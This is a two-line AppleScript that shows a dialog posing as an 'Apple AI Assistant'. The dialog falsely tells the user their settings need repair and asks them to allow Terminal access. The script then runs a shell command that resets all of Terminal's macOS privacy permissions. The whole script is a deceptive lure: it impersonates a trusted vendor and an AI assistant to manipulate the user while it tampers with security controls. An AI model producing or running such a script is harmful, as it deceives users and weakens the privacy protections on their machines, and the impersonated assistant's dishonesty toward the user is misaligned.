display dialog "Hi, I’m Apple AI Assistant. It looks like your settings need repair." & return & "Please allow Terminal access." buttons {"OK"} default button 1
do shell script "tccutil reset All com.apple.Terminal"
